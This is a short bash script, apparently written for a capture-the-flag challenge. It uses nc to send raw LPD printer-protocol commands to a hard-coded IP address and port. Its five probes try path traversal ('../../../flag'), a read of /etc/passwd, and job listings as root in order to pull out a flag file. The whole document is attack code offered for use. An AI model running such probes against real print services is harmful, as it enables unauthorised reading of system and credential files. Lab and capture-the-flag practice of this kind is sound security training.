#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

echo "=== Test 1: Comando 0x04 largo con path ==="
echo -ne "\x04/etc/passwd\n" | timeout 5s nc $TARGET $PORT
echo -e "\n---"

echo "=== Test 2: Comando 0x03 corto con argumentos ==="
echo -ne "\x03lp\x20../../../flag\n" | timeout 5s nc $TARGET $PORT
echo -e "\n---"

echo "=== Test 3: Lista de jobs con usuario ==="
echo -ne "\x04lp\x20root\n" | timeout 5s nc $TARGET $PORT
echo -e "\n---"

echo "=== Test 4: Comando 0x03 con lista de jobs específicos ==="
echo -ne "\x03lp root flag\n" | timeout 5s nc $TARGET $PORT
echo -e "\n---"

echo "=== Test 5: Formato RFC - short form con user list ==="
echo -ne "\x03lp flag /flag ../flag\n" | timeout 5s nc $TARGET $PORT
echo -e "\n---"